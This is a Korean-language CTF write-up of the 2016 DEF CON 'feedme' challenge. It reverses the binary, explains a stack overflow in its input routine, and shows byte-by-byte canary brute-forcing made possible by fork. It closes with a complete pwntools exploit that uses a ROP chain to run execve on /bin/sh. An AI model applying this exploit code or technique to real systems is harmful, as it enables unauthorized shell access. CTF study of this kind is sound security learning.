---
title: "2016 Defcon Feedme"
date: 2019-12-30
tags: [Defcon]
categories: [Defcon]
---

```
feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
```

바이너리 stripped 되어있고 statically linked라 좀 분석하기 어려워졌다.

`0x0804917A` 여기가 메인 함수고 메인함수에서는 그냥 signal함수를 이용해 SIGALARM을 150초 설정해놨다. 

그 이후  `sub_80490B0` 함수를 호출하는데 이 함수에서는 fork를 이용해 자식 프로세스를 생성한다. 0x31F번을 반복하는데 이 곳에서 우리가 입력받는 함수도 호출해준다. 

```c
int sub_8049036()
{
  unsigned __int8 v0; // ST1B_1
  char *v1; // eax
  int result; // eax
  char v3; // [esp+1Ch] [ebp-2Ch]
  unsigned int v4; // [esp+3Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  sub_804FC60("FEED ME!"); // puts
  v0 = sub_8048E42(); // size
  sub_8048E7E(&v3, v0); // input
  v1 = sub_8048F6E(&v3, v0, 0x10u); // convert 10 -> 16
  sub_804F700("ATE %s\n", v1); // printf
  result = v0;
  if ( __readgsdword(0x14u) != v4 )
    sub_806F5B0();
  return result;
}
```

여기가 우리가 입력받는 함수다. canary가 걸려있다. 

`sub_8048E42()` 함수는 입력한 문자열의 아스키 값을 v0에 저장한다. 

 `sub_8048E7E` 함수에서는 v0의 크기만큼을 입력을 받는데 v3 버퍼에 저장해준다.

`sub_8048F6E` 요기서 16진수 hex값으로 변환해준다. 

`sub_806F5B0()` 여기는 그냥 카나리 값 비교해주고 stack smashing detect 띄워주는 곳이다.

여기서 취약점 터진다. 카나리를 제외하고 buf 크기는 0x20만큼이다. 근데 여기서 buf 다음에 카나리가 있어서 canary 값을 1 byte bruteforce해줘서 canary leak해 줄 수 있다. 그리고 fork를 사용하기 때문에 카나리가 고정 값이다. `stack smashing detected` 가 안 뜰때 까지 bruteforing 해주면 된다.

익스는 그냥 statically linked 바이너리라 웬만한 가젯들이 다 있어서 syscall을 위한 가젯들이 다 있을거다.

 `int0x80 ret;  pop eax ret; pop ebx pop ecx pop ebx ret;` 이 가젯들 이용해서 syscall 다 맞춰줘서 read 이용해 bss영역에 `/bin/sh\x00` 을 넣고 `execve` 함수 이용해서 익스했다. 

> exploit.py

```python
from pwn import *

# context.log_level = 'debug'

e = ELF('./feedme')
p = process('./feedme')

peax = 0x080bb496 # pop eax ; ret
pop3ret = 0x0806f370 # pop edx ; pop ecx ; pop ebx ; ret
int0x80 = 0x0806fa20 # int 0x80 ; ret  ;  (1 found)

canary = ''
p.recvuntil('FEED ME!\n')
for j in range(0,4):
	for i in range(0,256):
		go = 'A'*0x20+canary+chr(i)
		p.send(chr(len(go)))
		p.send(go)
		if not 'stack smashing detected' in p.recvuntil("FEED ME!\n"):
			canary += chr(i)
			print canary
			break
log.info('canary : ' + canary)

payload = 'A'*0x20
payload += canary
payload += 'B'*12
payload += p32(peax) + p32(0x3)
payload += p32(pop3ret) + p32(10) + p32(e.bss()) + p32(0) + p32(int0x80)
payload += p32(peax) + p32(0xb)
payload += p32(pop3ret) + p32(0) + p32(0) + p32(e.bss()) + p32(int0x80)

p.send(chr(len(payload)))
p.send(payload)
sleep(0.1)
p.send('/bin/sh\x00')

p.interactive()
```





